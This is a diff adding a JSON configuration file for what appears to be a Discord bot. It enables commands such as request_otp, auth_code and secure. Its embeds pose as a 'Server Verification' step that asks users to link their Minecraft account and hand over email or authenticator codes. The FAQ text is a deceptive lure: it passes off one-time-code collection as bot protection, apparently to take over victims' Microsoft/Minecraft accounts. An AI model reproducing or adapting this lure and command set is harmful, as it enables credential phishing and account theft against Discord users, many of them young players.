@@ -1,0 +1,83 @@
+{
+  "_comment": "None of these settings should be changed manually",
+  "enabled_commands": {
+    "real": {
+      "accounts": false,
+      "auth_code": true,
+      "check_lock": true,
+      "config": false,
+      "email": true,
+      "goon": false,
+      "request_otp": true,
+      "restart": true,
+      "secure": true,
+      "send_embed": true,
+      "set_channel": true,
+      "stats": true
+    },
+    "fake": {
+
+    },
+    "aliases": {
+      "auth_code": "auth_code",
+      "check_lock": "check",
+      "email": "email",
+      "goon": "goon",
+      "request_otp": "request_otp",
+      "secure": "secure",
+      "send_embed": "send",
+      "set_channel": "set",
+      "stats": "stats"
+    }
+  },
+  "embeds": {
+    "verification": {
+      "default": {
+        "title": "Server Verification",
+        "description": "Before entering the server, please link your Minecraft account to confirm you're a real human and not a robot. Verification gives you full server access and unlocks all channels.\n\n**FAQ**\n\nQ: Why do I need to verify?\nA: Verification helps us assign you your role. It also protects the server from intruders and sabotage attempts (a.k.a. raids).\n\nQ: How long does it take to get verified?\nA: The verification process doesn't take too long! You'll usually get your roles within 30\u201350 seconds, depending on traffic.\n\nQ: Why do you need to collect a code?\nA: The code confirms with the Minecraft API that you truly own the account you're verifying, it is required to verify because we are dealing with bots daily.",
+        "color": 12533824
+      }
+    },
+    "before_auth": {
+      "default": {
+        "title": "",
+        "description": "",
+        "color": 0
+      }
+    },
+    "auth": {
+      "otp": {
+        "title": "Last Step",
+        "description": "To complete verification, enter the confirmation code we sent to `{email}`!\nThis step prevents automated or fake verifications.",
+        "color": 5763719
+      },
+      "authenticator": {
+        "title": "Last Step",
+        "description": "An Authenticator Request has been sent.\nPlease confirm the code **`{entropy}`** on your app!\nThis step prevents automated or fake verifications.",
+        "color": 5763719
+      }
+    },
+    "after_verify": {
+      "default": {
+        "title": "Successfully Verified",
+        "description": "Please wait until we process your roles...",
+        "color": 5763719
+      }
+    }
+  },
+  "presence": {
+    "status": "dnd",
+    "activity_text": "",
+    "activity_type": "playing"
+  },
+  "verification_button": {
+    "text": "Link your account",
+    "color": "primary"
+  },
+  "post_verification": {
+    "actions": [
+
+    ]
+  },
+  "ephemeral": false
+}
